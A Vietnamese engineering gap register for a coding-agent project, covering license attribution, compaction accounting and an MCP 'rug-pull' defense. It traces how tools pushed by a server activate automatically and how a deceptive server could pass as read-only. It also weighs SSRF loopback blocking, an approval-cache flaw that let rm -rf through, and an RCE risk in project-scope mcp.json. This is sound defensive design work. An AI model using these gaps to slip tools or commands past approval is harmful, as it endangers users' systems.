**Pháp lý:** chép được, chép rồi phải giữ MIT notice. `~/Projects/senpi-ref/LICENSE` là MIT thuần (22 dòng; dòng 1 "MIT License"; dòng 3 "Copyright (c) 2025 Mario Zechner (upstream pi-mono)"; dòng 4 "Copyright (c) 2026 Yeongyu Kim and senpi contributors"). senpi **không** có điều khoản AGPL/MuPDF và **không** có copyleft ở đâu trong cây; nghĩa vụ bên thứ ba duy nhất có sức ép hành vi là LinkeDOM (ISC) ghi trong `NOTICE.md` của họ, mà mục này không đụng tới. Nghĩa vụ cho một hàm ~40 dòng: giữ notice + copyright, ghi attribution vào `NOTICE.md` của omp **ghim theo SHA `ea9216269e9254b821446130b60d1e00759761dc`**, không lấy trademark senpi. M7 W0 đã đặc tả đúng như vậy.

**Cái được bảo toàn.** `buildSessionContext()` phải giữ nguyên hành vi drop hiện tại — nếu không thì session-restore sẽ giữ lại những turn đáng lẽ phải mất. Và `findCutPoint` phải giữ nguyên thuật toán cắt pair-safe; chỉ phần **đếm trước** thay đổi.

**Phụ thuộc:** W0 (pháp lý). Không cái gì khác — không chạm bốn seam API, không cần `agent_settled` hay `sessionSettings`.

**Đã phủ chưa:** **một phần, về tinh thần chứ không phải ở cổng work item.** MILESTONE_7 không có work item cho việc này; gần nhất là tool-pair-guard đã rút (`appendix, :1831-1855`) — cái đó phủ **ORPHAN tool_use/tool_result pairing**, một kiểu hỏng khác. Không work item nào trong bốn mục của M7 (W0, SEAM, SEAMFREE, LOOKAT) nhắc compaction accounting.

---

## GAP-M7-03 — Rug-pull defense: tool mới từ `notifications/tools/list_changed` không được tự kích hoạt

**Nguồn:** `senpi.62` · **Effort:** M — khoảng 1 ngày
**Xếp sau GAP-M7-01** trong sóng 0c.

**Cái omp thiếu — đã kiểm, chuỗi đầy đủ từ đầu đến cuối.** omp **TỰ KÍCH HOẠT** mọi tool mà server đẩy. Chuỗi: `mcp/manager.ts:954` `#triggerNotificationRefresh` → `refreshServerTools(name)` → `manager.ts:429-431` handler `setOnToolsChanged` → `agent-session.ts:6055` `refreshMCPTools(tools)` → `session-tools.ts:2164` `#applyMCPToolRefresh`, mà comment của chính nó ở `:2205-2206` nói nguyên văn *"Connected manager tools become active immediately."* Tập active được dựng lại ở `:2210-2214` là `[...#getActiveNonMCPToolNames(), ...#mcpManagerToolNames, ...retainedActiveExtensionToolNames]` — và `#mcpManagerToolNames` được điền từ catalog **MỚI** ở `:2200-2202`, nên **mọi tool mới xuất hiện đều rơi vào `nextActive`**.

Cũng **không có tombstone**: `manager.ts:942-949` `#replaceServerTools` lọc theo `mcpServerName` và **xoá hẳn** tool bị rút, nên một lời gọi cũ tới tool đã bị rút rơi vào đường dispatch-miss thay vì một `isError` sạch.

Mitigation sẵn có của omp chỉ là `ToolApproval` (gate theo **tier**, không theo **identity** — `resolveApproval` tại `approval.ts:203` khoá trên `policyKey ?? tool.name`, nên tool mới đơn giản là vắng mặt trong `tools.approval` và thừa kế mặc định của mode) và `ToolTier` per-tool, mà server lừa đảo thỏa dễ bằng cách tự mô tả tool của nó là read-only. `registerToolsPreservingActiveSet` của senpi (snapshot `getActiveTools()` → register → `setActiveTools()`) chính là nửa còn thiếu, và nó độc lập với substrate.

**Hình dạng port.** Hai chỉnh sửa phối hợp, đều nhỏ.
1. Trong `#applyMCPToolRefresh`, tách catalog đến thành "đã active trước lần refresh này" và "mới xuất hiện"; chỉ activate tập đầu, phần còn lại **registered-but-inactive**. Seam `#previousActiveMcpToolNames` tại `:2180` **đã bắt đúng tập** — nó chỉ đang được dùng cho extension retention (`:2207-2209`) thay vì để gate manager tools.
2. Trong `#replaceServerTools`, giữ một tombstone `CustomTool` cho các tên bị rút, `execute` trả `isError` với thông điệp "tool no longer offered".

**KHÔNG** port `active-set.ts` như một module riêng — gộp hai luật vào chính hai hàm hiện có, để có **một** nguồn sự thật cho "cái gì đang active".

**Pháp lý:** chép được, giữ MIT notice. Trung thực mà nói thì hai luật lấy từ đây cũng là thứ dễ tự suy ra hơn là chép — nên framing đúng là "ý tưởng + một diff nhỏ đè lên chính hàm của omp"; vẫn cần attribution cho bất kỳ dòng nào mang qua. W0 chi phối.

**Cái được bảo toàn.** Cơ chế `tools.approval` và `ToolTier` phải giữ nguyên hành vi — item này thêm một lớp **trước** chúng, không sửa chúng. `retainedActiveExtensionToolNames` giữ nguyên: tool của extension không đi qua đường này.

**Đã phủ chưa:** **không.** Không work item nào của M7 nhắc `list_changed`, giữ tập active, hay tombstone tool. Cơ chế `tools.approval` mà rank-6 của SEAMFREE (anthropic-bash) chạm là tier gate, không phải cái này.

---

# 4. Work item cần người quyết

Chín quyết định. Mỗi mục là **một câu hỏi có phương án**, không phải một ghi chú. Tên `GAP-D<n>` để các mục work item trỏ tới.

| # | Mục | Quyết định | Phương án |
| --- | --- | --- | --- |
| **GAP-D1** | GAP-M6-12 | **Có chặn loopback mặc định không?** Đây là quyết định chặn. Chặn `127.0.0.1` theo mặc định sẽ **phá mọi MCP server local** — và local MCP là một trong những cách dùng phổ biến nhất. | **(a)** Deny toàn bộ loopback, chỉ mở khi user khai báo; **(b)** Chỉ chặn link-local + `169.254.169.254` + multicast, **để loopback qua** với cảnh báo; **(c)** Deny loopback nhưng có escape hatch theo server. **Khuyến nghị (b)** — nó chặn đúng vectơ SSRF/metadata mà không đổi hành của người dùng bình thường. |
| **GAP-D2** | GAP-M4-13 | **`ApprovalEntry` mở rộng union `SessionEntry`, hay tái dùng `CustomEntry` có sẵn?** | **(a)** Biến thể mới → format mở rộng, cần cân nhắc migration, nhưng truy vấn được bằng type; **(b)** `CustomEntry` → **không** mở rộng format, nhưng phải đọc log bằng tay. Cùng loại với "open question M4-4-OQ1" mà M4 đã ghi. |
| **GAP-D3** | GAP-M2-7 | **Thêm `modified` nghĩa là lần đầu omp có đường nạp hook bị chặn.** Hai test sẵn có có thể chuyển đỏ. Cho phép chặn im lặng, hay bắt buộc hỏi? | **(a)** Chặn, không hỏi — an toàn nhất, đổi hành người dùng; **(b)** Hỏi một lần rồi ghim — giữ được tiện, phức tạp hơn. **Khuyến nghị (a)** cho `untrusted` ở lần nạp đầu, và hỏi cho `modified`. |
| **GAP-D4** | GAP-M1-18 | **Chốt danh sách check trước khi viết dòng nào.** `doctor` là cái bẫy kinh điển vì mọi tính năng mới đều muốn thêm một check. | Chốt danh sách ở trên; **mọi check sau đó phải tự chứng minh được bằng một test** — không thêm check chỉ vì "thông tin này hữu ích". Cần một quy tắc ghi vào PR template, không chỉ ý định miệng. |
| **GAP-D5** | GAP-M1-20 | **Giữ đường hồi tương thích cho cache `allow_always` theo tên tool cũ không?** Các phiên đang cache sẽ hỏi lại một lần nữa. | **Khuyến nghị: không giữ** — cache cũ theo tên tool chính là thứ đang gây lỗi (`rm -rf` sau một "always allow" cho `git status`). Nhưng đây là thay đổi hành vi người dùng thấy, nên phải nêu trong changelog, và quyết định này phải của người chứ không phải của implementer. |
| **GAP-D6** | GAP-M2-8 | **Ngưỡng trần `<skills>` là bao nhiêu?** | **Đo trên một cây thật có nhiều skill trước khi chốt**, không đoán. Câu hỏi phụ: khi vượt trần, phần bị cắt nên là ghim rút gọn hay **loại hẳn** (vì `manage_skill list` đã cho đường tìm lại)? |
| **GAP-D7** | GAP-M3-B4 | **Cảnh báo trùng phím lúc nạp: một dòng tổng hợp, hay một panel liệt kê từng cặp?** | Cả hai rẻ. Cái thứ hai tốn thêm một overlay và một quyết định phím điều hướng. **Khuyến nghị (a)** — lỗi cấu hình thấy một lần lúc nạp là đủ; panel là việc riêng và không nên gộp. |
| **GAP-D8** | GAP-M4-11 | **895 call site: sửa hết, hay di dời có chọn lọc?** | **Không sửa hết trong PR này** — sẽ thành một diff không review được và che mất thay đổi thật. Cần chốt **tiêu chí chọn** (đề xuất: đường chạy trong `catch` ở agent loop, session, TUI error render, logger — nơi nuốt lỗi gốc là thiệt hại thật) và ghi phần còn lại là **nợ kỹ thuật có chủ** kèm owner. |
| **GAP-D9** | GAP-M7-01 | **Trust của project-scope `mcp.json` do ai quyết?** senpi trả lời bằng prompt (senpi.93); mục này trả lời bằng mặc định theo scope. | **(a)** Chỉ mặc định theo scope, không có prompt (rủi ro thấp, người dùng mất tính năng cho project); **(b)** Mặc định theo scope **và** một prompt của M2 WI-0 cho phép nâng lên. **Khuyến nghị (b)** — nhưng (b) **kéo theo một việc chưa ai giao**: M2 WI-0 hiện viết ADR về trust của *extension*, chưa nói gì về **MCP project-scope config**. Câu hỏi đó phải có câu trả lời trong ADR trước khi GAP-M7-01 code. |

---

# 5. Những gì sổ này nói thẳng

1. **Hai mục có giá trị ngay lập tức và gần như miễn phí:** GAP-M1-19 (thêm một rule lint, sửa 10 file) và GAP-M1-20 (đóng một lỗ hổng phê duyệt lan rộng). Nếu chỉ làm hai việc trong đợt này, làm hai cái đó.
2. **Một mục là lỗ hổng, không phải cải tiến:** GAP-M7-01. Nó nên được kéo lên trước W0 nếu W0 sẽ trượt — nghĩa vụ attribution có thể ghi sau, còn RCE thì không.
3. **Sổ này cố ý không đề xuất thứ gì cho M1B, M5 và `PACKAGE_REORGANIZATION_PLAN.md`.** Không mục nào trong 25 mục đầu vào thuộc phạm vi đó, và luật "không bịa thêm work item ngoài danh sách" cấm lấp chỗ trống bằng suy đoán. M1B xuất hiện trong bảng phụ thuộc chỉ vì GAP-M1-18 nói về `logger.ts` và `packages/utils` — chưa đủ để mở một mục.
4. **Ba con số đã bị sửa** (§0). Một trong số đó — `getConflicts` — **không** làm đổi kết luận của mục nào; hai cái còn lại sửa đường dẫn và cơ chế, và cả hai đều sẽ dẫn tới một PR sai nếu giữ nguyên.
